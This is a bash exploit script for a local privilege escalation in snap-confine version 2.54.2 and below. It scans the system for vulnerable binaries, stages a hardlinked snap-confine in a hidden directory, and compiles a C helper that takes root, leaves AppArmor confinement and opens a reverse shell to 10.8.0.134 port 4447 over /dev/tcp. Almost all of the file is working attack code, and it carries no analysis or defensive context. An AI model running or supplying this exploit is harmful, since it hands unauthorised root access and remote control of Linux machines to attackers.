#!/bin/bash

vulnerable_versions=()

# Find all files named "snap-confine"
file_list=$(find / -type f -name "snap-confine" 2>/dev/null)

# Loop through each file
for file_path in $file_list; do
  # Run "--version" against each file
  version_output=$("$file_path" --version 2>&1)

  # Extract the version using regex
  version=$(echo "$version_output" | grep -oP 'snap-confine \K\d+\.\d+\.\d+')

  # Check if the version is 2.54.2 or less
  if [[ "$(printf '%s\n' "2.54.2" "$version" | sort -V | head -n1)" == "$version" ]]; then
    echo "Vulnerable version found: $version at $file_path"
    vulnerable_versions+=("$version")
  else
    echo "Non-vulnerable version found: $version"
  fi
done

if [[ ${#vulnerable_versions[@]} -gt 0 ]]; then
  echo "Performing actions with a vulnerable version..."
  chosen_version=${vulnerable_versions[0]}
  echo "Chosen vulnerable version: $chosen_version"
  mkdir -m 0700 /tmp/.tmp
  mkdir -m 0700 ~/.Private
  cd ~/.Private
  mv -i /tmp/.tmp ./
  cd .tmp
  ln -i /usr/lib/snapd/snap-confine ./
  cp -i "$(which true)" snap-update-ns

  cat > snap-discard-ns.c << "EOF"
  #include <sys/types.h>
  #include <unistd.h>
  #include <stdio.h>

  int main(void) {
      if (setuid(0)) _exit(__LINE__);
      if (setgid(0)) _exit(__LINE__);

      FILE * const fp = fopen("/proc/self/attr/exec", "w");
      if (!fp) _exit(__LINE__);
      if (fputs("exec snap.lxd.daemon", fp) < 0) _exit(__LINE__);
      if (fclose(fp)) _exit(__LINE__);

      char * const argv[] = { "/bin/bash", "-c", "exec aa-exec -p unconfined -- "
          "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.0.134/4447 0>&1; cat /proc/self/attr/current'", NULL };
      execve(*argv, argv, NULL);
      _exit(__LINE__);
  }
EOF

  sleep 2

  gcc -o snap-discard-ns snap-discard-ns.c

  sleep 1

  env -i SNAPD_DEBUG=1 SNAP_INSTANCE_NAME=lxd aa-exec -p /usr/lib/snapd/snap-confine -- ./snap-confine --base snapd snap.lxd.daemon /nonexistent
else
  echo "No vulnerable versions found."
fi
